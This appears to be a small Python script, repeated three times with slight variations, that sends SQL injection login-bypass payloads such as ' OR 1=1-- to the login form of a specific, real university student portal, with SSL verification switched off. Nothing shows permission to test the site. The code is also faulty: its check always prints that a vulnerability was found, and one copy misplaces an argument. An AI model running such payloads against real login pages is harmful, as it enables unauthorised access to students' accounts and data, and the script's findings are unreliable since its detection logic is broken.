''' 
import requests

url = "https://studentportal.egerton.ac.ke/portal/"
payload = "' OR 1=1--"

response = requests.post(url, data={"username": payload, "password": "password", verify=False})

if "authenticated":
    print("SQL injection vulnerability found")
else:
    print("No SQL injection vulnerability found")
'''

import requests

url = 'https://studentportal.egerton.ac.ke/portal/'
payload = "' OR '1'='1"  # Example payload for SQL injection

# Disable SSL verification (not recommended for production)
response = requests.post(url, data={"username": payload, "password": "password"}, verify=False)

if "authenticated":
    print("SQL injection vulnerability found")
else:
    print("No SQL injection vulnerability found")






'''
import requests

url = "https://studentportal.egerton.ac.ke/portal/"
payload = "' OR 1=1--"

response = requests.post(url, data={"username": payload, "password": "password"}, verify=True)

if "authenticated":
    print("SQL injection vulnerability found")
else:
    print("No SQL injection vulnerability found")
'''